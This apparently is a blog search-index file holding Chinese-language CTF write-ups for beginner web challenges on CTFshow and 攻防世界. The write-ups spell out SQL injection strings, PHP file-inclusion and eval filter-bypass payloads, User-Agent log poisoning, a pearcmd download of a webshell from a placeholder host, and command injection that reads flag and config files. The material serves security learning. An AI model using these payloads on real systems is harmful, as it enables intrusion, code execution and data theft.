<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CTFshow_WEB</title>
    <url>/2021/08/01/CTFshow_WEB/</url>
    <content><![CDATA[<h1 id="CTFshow-WEB"><a href="#CTFshow-WEB" class="headerlink" title="CTFshow_WEB"></a>CTFshow_WEB</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>发现做题还挺有意思的，当然，出题就没意思了</p>
<p>题目地址：<a href="https://ctf.show/challenges">https://ctf.show/challenges</a></p>
<h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p>按顺序做题</p>
<h3 id="web签到题"><a href="#web签到题" class="headerlink" title="web签到题"></a>web签到题</h3><p>F12开发者工具，找到flag</p>
<p><img src="/2021/08/01/CTFshow_WEB/image-20210801181150932.png" alt="image-20210801181150932"></p>
<p>burp的decode模块，base64解密</p>
<p><img src="/2021/08/01/CTFshow_WEB/image-20210801181316698.png" alt="image-20210801181316698"></p>
<h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>最简单的sql注入</p>
<ol>
<li>查当前数据库名称</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 union select 1,database(),3 limit 1,2;#-- </span><br></pre></td></tr></table></figure>

<p><em>得到数据库名称web2</em></p>
<ol start="2">
<li>查看数据库表的数量</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 union select 1,(select count(*) from information_schema.tables where table_schema = &#x27;web2&#x27;),3 limit 1,2;#-- </span><br></pre></td></tr></table></figure>

<p><em>得到数据库表数量为2</em></p>
<ol start="3">
<li>查表的名字</li>
</ol>
<p><strong>第一个表:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 union select 1,(select table_name from information_schema.tables where table_schema = &#x27;web2&#x27; limit 0,1),3 limit 1,2;#-- </span><br></pre></td></tr></table></figure>

<p><em>得到表名：flag</em> </p>
<p><strong>第二个表:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 union select 1,(select table_name from information_schema.tables where table_schema = &#x27;web2&#x27; limit 1,2),3 limit 1,2;#-- </span><br></pre></td></tr></table></figure>

<p><em>得到表名：user</em></p>
<ol start="4">
<li>查flag表列的数量</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 union select 1,(select count(*) from information_schema.columns where table_name = &#x27;flag&#x27; limit 0,1),3 limit 1,2;#-- </span><br></pre></td></tr></table></figure>

<p><em>只有1列</em></p>
<ol start="5">
<li>查flag表列的名字</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 union select 1,(select column_name from information_schema.columns where table_name = &#x27;flag&#x27; limit 0,1),3 limit 1,2;#-- </span><br></pre></td></tr></table></figure>

<p><em>列名为flag</em></p>
<ol start="6">
<li>查flag表记录的数量</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 union select 1,(select count(*) from flag),3 limit 1,2;#-- </span><br></pre></td></tr></table></figure>

<p><em>只有一条记录</em></p>
<ol start="7">
<li>查flag表记录值</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 union select 1,(select flag from flag limit 0,1),3 limit 1,2;#-- </span><br></pre></td></tr></table></figure>

<p><em>得到flag</em></p>
<h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><p>查看：<a href="https://segmentfault.com/a/1190000018991087#item-2">PHP伪协议总结 - SegmentFault 思否</a> </p>
<p><a href="https://www.freebuf.com/articles/web/182280.html">Web安全实战系列：文件包含漏洞 - FreeBuf网络安全行业门户</a></p>
<p>这个绕过方法很多：</p>
<ol>
<li><p>payload：<code>?url=data://text/plain,&lt;?php @eval(system(&#39;cat ctf_go_go_go&#39;));?&gt;</code><br><img src="/2021/08/01/CTFshow_WEB/image-20210801184529057.png"></p>
</li>
<li><p>payload：<code>?url=php:\\input</code><br><img src="/2021/08/01/CTFshow_WEB/image-20210801184946681.png" alt="image-20210801184946681"></p>
</li>
</ol>
<h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><p>与上一题相似，但是增加了更多的条件</p>
<p>日志包含漏洞，所以burp</p>
<h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><p>在php中，变量都是弱类型的（就是不指定特定数据类型的）</p>
<p>使用if判等的时候要格外小心，使用特殊的参数可能会使本来不相等的if判断位相等</p>
<p>参考：<a href="https://blog.csdn.net/qq_38603541/article/details/97108663">常见的MD5碰撞：md5值为0e开头</a></p>
<p>在php中0e会被当做科学计数法，就算后面有字母，其结果也是0，所以上面的if判断结果使true，成功绕过</p>
<p><img src="/2021/08/01/CTFshow_WEB/image-20210801181459378.png" alt="image-20210801181459378"></p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFshow萌新区web题</title>
    <url>/2021/07/17/CTFshow%E8%90%8C%E6%96%B0%E5%8C%BAweb%E9%A2%98/</url>
    <content><![CDATA[<h1 id="CTFshow萌新区web题"><a href="#CTFshow萌新区web题" class="headerlink" title="CTFshow萌新区web题"></a>CTFshow萌新区web题</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>放暑假了，无聊，而且有点焦虑，要找工作或者考研了。</p>
<p>再次试着做做CTF题目，学习或者缓解焦虑。</p>
<p>靶场是<a href="https://ctf.show/">ctfshow</a>，主要是人多也有q群，不会可以去问问别人。</p>
<h2 id="7-17-星期六"><a href="#7-17-星期六" class="headerlink" title="7.17 星期六"></a>7.17 星期六</h2><p>萌新区的密码学、杂项全部空过，不想动脑子</p>
<p>Web 1-8是一个系列故事，前7个都是要从article表中得到id字段=1000的那个记录，最后一个是删库跑路<code>rm -rf /*</code></p>
<p>前七个都是GET方法的sql注入，然后增加了一些过滤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;web7&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"># 包含数据库连接文件</span><br><span class="line">include(&quot;config.php&quot;);</span><br><span class="line"># 判断get提交的参数id是否存在</span><br><span class="line">if(isset($_GET[&#x27;id&#x27;]))&#123;</span><br><span class="line">        $id = $_GET[&#x27;id&#x27;];</span><br><span class="line">    if(preg_match(&quot;/\&#x27;|\&quot;|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\^|\!|\~|x|hex|\(|\)|\+|select/i&quot;,$id))&#123;</span><br><span class="line">            die(&quot;id error&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    # 判断id的值是否大于999</span><br><span class="line">    if(intval($id) &gt; 999)&#123;</span><br><span class="line">        # id 大于 999 直接退出并返回错误</span><br><span class="line">        die(&quot;id error&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        # id 小于 999 拼接sql语句</span><br><span class="line">        $sql = &quot;select * from article where id = $id order by id limit 1 &quot;;</span><br><span class="line">        echo &quot;执行的sql为：$sql&lt;br&gt;&quot;;</span><br><span class="line">        # 执行sql 语句</span><br><span class="line">        $result = $conn-&gt;query($sql);</span><br><span class="line">        # 判断有没有查询结果</span><br><span class="line">        if ($result-&gt;num_rows &gt; 0) &#123;</span><br><span class="line">            # 如果有结果，获取结果对象的值$row</span><br><span class="line">            while($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">                echo &quot;id: &quot; . $row[&quot;id&quot;]. &quot; - title: &quot; . $row[&quot;title&quot;]. &quot; &lt;br&gt;&lt;hr&gt;&quot; . $row[&quot;content&quot;]. &quot;&lt;br&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        # 关闭数据库连接</span><br><span class="line">        $conn-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;!-- flag in id = 1000 --&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>几个函数：</p>
<ol>
<li><code>isset</code>，检测变量是否已设置并且非 <code>NULL</code>，也就是是否GET方法传入参数</li>
<li><code>preg_match</code>，正则表达式匹配，如果出现则id error</li>
<li><code>intval</code>，返回一个字符串中非数字前的数字，如，<code>intval(&#39;1 or 1=1 #&#39;)</code>返回值是<code>1</code></li>
<li><code>$conn</code>，数据库连接，有一些成员函数，<code>query($sql)</code>执行sql语句、<code>fetch_assoc()</code>、<code>close()</code>等</li>
<li><code>highlight_file(__FILE__)</code>，显示当前文件内容</li>
</ol>
<p>解题思路：</p>
<ol>
<li><p>我们的目的是得到id=1000的记录的content，一共有两个需要解决的的地方：</p>
<ul>
<li><code>if(preg_match(&quot;/\&#39;|\&quot;|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\^|\!|\~|x|hex|\(|\)|\+|select/i&quot;,$id))&#123;die(&quot;id error&quot;);</code>id不能出现这些（不区分大小写）字符<code>&#39; &quot; or | - \\ / * &lt; &gt; ^ ! ~ x hex ( ) + select </code></li>
<li><code>if(intval($id) &gt; 999)&#123;die(&quot;id error&quot;);</code>函数返回值不能大于999</li>
</ul>
</li>
<li><p>根据这些过滤，我们的有很多可能通过的<code>id</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;1000&#x27;</span><br><span class="line">&quot;1000&quot;</span><br><span class="line">1 or 1=1 %23</span><br><span class="line">1 || 1=1 %23</span><br><span class="line">500/0.5</span><br><span class="line">2*500</span><br><span class="line">500&lt;&lt;1</span><br><span class="line">~~1000</span><br><span class="line">0x3e8</span><br><span class="line">hex(1000)</span><br><span class="line">1+999</span><br><span class="line">1 union select * from article where id=1000</span><br><span class="line">0b1111101000</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="7-19-星期一"><a href="#7-19-星期一" class="headerlink" title="7.19 星期一"></a>7.19 星期一</h2><p><del>昨天和朋友去唱歌了，嗓子疼。</del></p>
<p>web 9是sql注入，执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"># flag in config.php</span><br><span class="line">include(&quot;config.php&quot;);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">        if(preg_match(&quot;/system|exec|highlight/i&quot;,$c))&#123;</span><br><span class="line">                eval($c);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;cmd error&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>函数：</p>
<ol>
<li><code>eval()</code>函数把字符串按照 PHP 代码来计算。该字符串必须是合法的 PHP 代码，且必须以分号结尾。</li>
<li><code>highlight_file()</code>函数，显示文件内容</li>
<li><code>exec($command,$array)</code>不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面。</li>
<li><code>system($command)</code> 输出并返回最后一行shell结果</li>
</ol>
<p>解题：</p>
<ol>
<li>需要包含这几个字符串，其实任何函数都可以执行。</li>
<li>选择<code>highlight_file(&#39;config.php&#39;);</code></li>
</ol>
<p>web 10类似，但是是不能出现那三个字符串</p>
<p>解题：</p>
<ol>
<li>可以将<code>system</code>拆分成<code>sys</code>和<code>tem</code>，然后再拼起来</li>
<li>payload：<code>?c=$a=&#39;sys&#39;;$b=&#39;tem&#39;;$d=$a.$b;$d(&#39;tac config.php&#39;);</code></li>
</ol>
<p>在网上搜答案搜到的一些方法，非常不错：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">根据黑名单的不同，获取config.php的内容有以下几种方法:</span><br><span class="line"><span class="number">1</span>.命令执行函数</span><br><span class="line">system()、passthru()、exec()、shell_exec()、popen()、proc_open()、pcntl_exec()</span><br><span class="line">?c=passthru(<span class="string">&#x27;cat config.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.构造</span><br><span class="line">?c=<span class="variable">$a</span>=<span class="string">&#x27;sys&#x27;</span>;<span class="variable">$b</span>=<span class="string">&#x27;tem&#x27;</span>;<span class="variable">$d</span>=<span class="variable">$a</span>.<span class="variable">$b</span>;<span class="variable">$d</span>(<span class="string">&#x27;cat config.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>.绕过cat命令</span><br><span class="line">?c=highlight_file(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line">?c=system(<span class="string">&#x27;ca&quot;&quot;t config.php&#x27;</span>);</span><br><span class="line">?c=system(<span class="string">&quot;ca&#x27;&#x27;t config.php&quot;</span>);</span><br><span class="line">?c=system(<span class="string">&#x27;ca\t config.php&#x27;</span>);</span><br><span class="line">linux有很多类似于cat的方法:tac、more、less、head、tail、nl、sed、sort、uniq</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>.base64绕过</span><br><span class="line">?c=<span class="variable">$a</span>=base64_decode(<span class="string">&#x27;c3lzdGVt&#x27;</span>);<span class="variable">$b</span>=base64_decode(<span class="string">&#x27;Y2F0IGNvbmZpZy5waHA=&#x27;</span>);<span class="variable">$a</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>.绕过分号;</span><br><span class="line">?c=system(<span class="string">&#x27;cat config.php&#x27;</span>)<span class="meta">?&gt;</span></span><br><span class="line">?c=assert(base64_decode(<span class="string">&#x27;c3lzdGVtKCdjYXQgY29uZmlnLnBocCcp&#x27;</span>))<span class="meta">?&gt;</span> <span class="comment">//assert()会将字符串当做PHP代码来执行，并且字符串末尾可以没有分号</span></span><br><span class="line"></span><br><span class="line"><span class="number">6</span>.POST传值</span><br><span class="line">?c=<span class="keyword">echo</span> `<span class="variable">$_POST</span>[<span class="string">&quot;sung&quot;</span>]`; <span class="comment">// ``是为了执行命令</span></span><br><span class="line"><span class="comment">//然后再通过post传参sung=cat+config.php,具体是通过BUrpsuite抓包然后修改为POST，然后加Content-Type: application/x-www-form-urlencoded或者用浏览器插件hackerbar添加POST data。</span></span><br><span class="line"></span><br><span class="line">其他函数:</span><br><span class="line"><span class="comment">//打印该目录下所有文件名</span></span><br><span class="line">?c=var_dump(glob(<span class="string">&#x27;*&#x27;</span>)); <span class="comment">//信息更全面</span></span><br><span class="line">?c=print_r(glob(<span class="string">&#x27;*&#x27;</span>));</span><br><span class="line">?c=print_r(scandir(<span class="string">&#x27;.&#x27;</span>));</span><br><span class="line"><span class="comment">//下面两个同第二个，只是不带参数</span></span><br><span class="line">?c=print_r(scandir(pos(localeconv())));</span><br><span class="line">?c=print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure>

<p>payload：<code>?c=assert(base64_decode(%27aGlnaGxpZ2h0X2ZpbGUoJ2NvbmZpZy5waHAnKQ==%27))?&gt;</code></p>
<h2 id="7-23-星期五"><a href="#7-23-星期五" class="headerlink" title="7.23 星期五"></a>7.23 星期五</h2><p><del>首先是，犯下懒惰之罪的。。。</del></p>
<p>web 17是<code>nginx/1.16.1</code>服务器（404页面）</p>
<p><code>include($c)</code>：通过 include 或 require 语句，可以将 PHP 文件的内容插入另一个 PHP 文件（在服务器执行它之前）。</p>
<p>日志保存在<code>/var/log/nginx/access.log</code></p>
<p>思路：因为不让直接包含php执行代码，所以我们用<code>include</code>包含被保存的日志文件，日志文件会保存<code>User-Agent</code>，如果我们用<code>User-agent</code>头注入（通过<code>burpsuite</code>抓包），在日志文件里面注入<code>&lt;?php system(&#39;ls&#39;)?&gt;</code>，我们就可以绕过过滤<code>php</code>得到文件目录，任意命令都可以执行，我们看到有<code>index.php 36.php</code>两个，然后<code>hightlight_file(&#39;36d.php&#39;)</code>看到flag。</p>
<p><img src="/2021/07/17/CTFshow%E8%90%8C%E6%96%B0%E5%8C%BAweb%E9%A2%98/image-20210724111219258.png" alt="image-20210724111219258"></p>
<p><img src="/2021/07/17/CTFshow%E8%90%8C%E6%96%B0%E5%8C%BAweb%E9%A2%98/image-20210724111153369.png" alt="image-20210724111153369"></p>
<p>web18-21 都是相同的思路</p>
<h2 id="7-25-星期日"><a href="#7-25-星期日" class="headerlink" title="7.25 星期日"></a>7.25 星期日</h2><p>其实之后的都已经很难了，我基本上都是根据别人的wp做的，希望能够得到提高。</p>
<p>web 22 服务器上下载文件</p>
<p>payload：<code>pearcmd&amp;+download+http://xx.xx.xx.xx/1.php</code>一句话木马</p>
<p>快乐题，利用<code>&gt;</code>生成文件，<code>*</code>通配符命令在这里相当于<code>nl xx.php</code>，还有<code>nl</code>命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload：</span><br><span class="line">?1=&gt;nl</span><br><span class="line">?1=ls</span><br><span class="line">?1=*&gt;z        //*执行后的内容，写入z文件</span><br><span class="line">直接访问z文件，下载查看内容</span><br></pre></td></tr></table></figure>

<p>web 23、24上传文件，用python脚本提交。</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF攻防世界web新手区2</title>
    <url>/2021/08/09/CTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA2/</url>
    <content><![CDATA[<h1 id="CTF攻防世界web新手区2"><a href="#CTF攻防世界web新手区2" class="headerlink" title="CTF攻防世界web新手区2"></a>CTF攻防世界web新手区2</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>昨天做了前6道题，其实有点仓促，今天把剩下的做完。</p>
<h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p><img src="/2021/08/09/CTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA2/image-20210808221541997.png" alt="image-20210808221541997"></p>
<ol>
<li><p>simple_php，考察的是PHP的弱类型比较，GET传入参数a=0e1、b=10000c，没有截图。</p>
</li>
<li><p>get_post，分别用get、post方法传入a、b变量得到flag，用hacker bar插件或者burp抓包重放。<br><img src="/2021/08/09/CTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA2/image-20210808221905781.png" alt="image-20210808221905781"></p>
</li>
<li><p>xff_referer，这个其实不会，查阅得知，X-Forwarded-For:简称XFF头，它代表客户端，也就是request的IP；Referer:告诉服务器访问来源，如果referer内容不符合要求，服务器可以拦截或者重定向请求。<br><img src="/2021/08/09/CTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA2/image-20210808223204376.png" alt="image-20210808223204376"></p>
</li>
<li><p>webshell，这个我熟，有好多方法但是原理是一样的，就是可以随意POST一个shell然后执行它，这就是一个webshell一句话木马，这里提供两种：hacker、burp和蚁剑（我最推荐这个，因为简单方便）<br><img src="/2021/08/09/CTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA2/image-20210808224326851.png" alt="image-20210808224326851"></p>
<p>蚁剑<br><img src="/2021/08/09/CTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA2/image-20210808224512087.png" alt="image-20210808224512087"></p>
<p><img src="/2021/08/09/CTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA2/image-20210808224544571.png" alt="image-20210808224544571"></p>
<p><img src="/2021/08/09/CTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA2/image-20210808224606066.png" alt="image-20210808224606066"></p>
</li>
<li><p>command_execution，这个ping和waf都是未曾接触过的，命令执行漏洞，查阅资料如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">windows或linux下:</span><br><span class="line">1. command1 &amp;&amp; command2 先执行command1，如果为真，再执行command2</span><br><span class="line">2. command1 | command2 只执行command2</span><br><span class="line">3. command1 &amp; command2 先执行command2后执行command1</span><br><span class="line">4. command1 || command2 先执行command1，如果为假，再执行command2</span><br></pre></td></tr></table></figure>

<p>先试了一下127.0.0.1执行的是ping -c 3 127.0.0.1。构造payload：<code>| find \home flag</code>。知道位置之后直接<code>| cat /home/flag.txt</code>，得到flag。</p>
<p><img src="/2021/08/09/CTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA2/image-20210808225821434.png" alt="image-20210808225821434"></p>
<p><img src="/2021/08/09/CTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA2/image-20210808225956365.png" alt="image-20210808225956365"></p>
</li>
<li><p>simple_js，JavaScript一直没有去看过，语法都是一知半解，所以先学js，然后代码审计。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">dechiffre</span>(<span class="params">pass_enc</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> pass = <span class="string">&quot;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&quot;</span>; </span><br><span class="line">        <span class="keyword">var</span> tab  = pass_enc.split(<span class="string">&#x27;,&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> tab2 = pass.split(<span class="string">&#x27;,&#x27;</span>);</span><br><span class="line">    	<span class="keyword">var</span> i,j,k,l=<span class="number">0</span>,m,n,o,p = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    	i = <span class="number">0</span>;</span><br><span class="line">    	j = tab.length;</span><br><span class="line">        k = j + (l) + (n=<span class="number">0</span>);</span><br><span class="line">        n = tab2.length;</span><br><span class="line">        <span class="keyword">for</span>(i = (o=<span class="number">0</span>); i &lt; (k = j = n); i++ )</span><br><span class="line">        &#123;</span><br><span class="line">            o = tab[i-l];</span><br><span class="line">            p += <span class="built_in">String</span>.fromCharCode((o = tab2[i]));</span><br><span class="line">			<span class="keyword">if</span>(i == <span class="number">5</span>)<span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">for</span>(i = (o=<span class="number">0</span>); i &lt; (k = j = n); i++ )</span><br><span class="line">        &#123;</span><br><span class="line">			o = tab[i-l];</span><br><span class="line">			<span class="keyword">if</span>(i &gt; <span class="number">5</span> &amp;&amp; i &lt; k-<span class="number">1</span>)</span><br><span class="line">			p += <span class="built_in">String</span>.fromCharCode((o = tab2[i]));</span><br><span class="line">        &#125;</span><br><span class="line">        p += <span class="built_in">String</span>.fromCharCode(tab2[<span class="number">17</span>]);</span><br><span class="line">        pass = p;</span><br><span class="line">    	<span class="keyword">return</span> pass;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">String</span>[<span class="string">&quot;fromCharCode&quot;</span>](dechiffre(<span class="string">&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;</span>));</span><br><span class="line"></span><br><span class="line">    h = <span class="built_in">window</span>.prompt(<span class="string">&#x27;Enter password&#x27;</span>);</span><br><span class="line">    alert( dechiffre(h) );</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>几个特色：</p>
<ol>
<li>js的连等赋值。A=B=C的赋值顺序是：B=C、A=B。</li>
<li><code>String.fromCharCode((o = tab2[i]));</code>其实是正确的用法，返回一个字符或字符串。显然后面的 <code>String[&quot;fromCharCode&quot;]</code>用法是错的。</li>
<li>a=(b=2)式子中a的值是2</li>
</ol>
<p>在自己的本地的html文件中，将代码简化，并将pass从<code>FAUX PASSWORD HAHA</code>换成flag的html代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">dechiffre</span>(<span class="params">pass_enc</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> pass = <span class="string">&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;</span>; </span><br><span class="line">        <span class="keyword">var</span> tab2 = pass.split(<span class="string">&#x27;,&#x27;</span>);</span><br><span class="line">    	<span class="keyword">var</span> i,j,k,l=<span class="number">0</span>,m,n,o,p = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; tab2.length; i++ )</span><br><span class="line">        &#123;</span><br><span class="line">            p += <span class="built_in">String</span>.fromCharCode( tab2[i]);</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">    h = <span class="built_in">window</span>.prompt(<span class="string">&#x27;Enter password&#x27;</span>);</span><br><span class="line">    alert( dechiffre(h) );</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>执行过程：</p>
<ol>
<li><img src="/2021/08/09/CTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA2/image-20210809161650755.png" alt="image-20210809161650755"></li>
<li>然后用<code>,</code>分隔开保存在tab2数组。</li>
<li>循环，将十进制数组转换成flag字符串</li>
<li>返回这个字符串p</li>
</ol>
<p>运行这个文件得到flag：<br><img src="/2021/08/09/CTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA2/image-20210809161925878.png" alt="image-20210809161925878"></p>
</li>
</ol>
<p><img src="/2021/08/09/CTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA2/image-20210809162022962.png" alt="image-20210809162022962"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li><p>X-Forwarded-For: 简称XFF头，它代表客户端，也就是request的IP；</p>
</li>
<li><p>Referer: 告诉服务器访问来源，如果referer内容不符合要求，服务器可以拦截或者重定向请求。</p>
</li>
<li><pre><code>windows或linux下:
1. command1 &amp;&amp; command2 先执行command1，如果为真，再执行command2
2. command1 | command2 只执行command2
3. command1 &amp; command2 先执行command2后执行command1
4. command1 || command2 先执行command1，如果为假，再执行command2
</code></pre>
</li>
<li><p>js代码审计</p>
</li>
</ol>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF攻防世界web新手区</title>
    <url>/2021/08/08/CTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA/</url>
    <content><![CDATA[<h1 id="CTF攻防世界web新手区"><a href="#CTF攻防世界web新手区" class="headerlink" title="CTF攻防世界web新手区"></a>CTF攻防世界web新手区</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>之前找到的ctfshow是一个刷题的网站，还行但是不够好，攻防世界直接体验拉满。</p>
<h2 id="耍几道"><a href="#耍几道" class="headerlink" title="耍几道"></a>耍几道</h2><p><img src="/2021/08/08/CTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA/image-20210808182101461.png" alt="image-20210808182101461"></p>
<ol>
<li><p>view source，直接F12开发者工具查看源码</p>
</li>
<li><p>robots，查看robots.txt找到flag文件，查看flag文件找到flag。<br><img src="/2021/08/08/CTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA/image-20210808182214125.png" alt="image-20210808182214125"><br><img src="/2021/08/08/CTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA/image-20210808182313373.png" alt="image-20210808182313373"></p>
</li>
<li><p>backup，index.php.bak就是index.php的备份文件，得到flag。（.bak备份文件保证当源文件不小心被删掉或者出现故障导致无故自动退出时，还可以从.bak备份文件继续编辑，减少了误操作带来的损失。）<br><img src="/2021/08/08/CTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA/image-20210808184007844.png" alt="image-20210808184007844"></p>
</li>
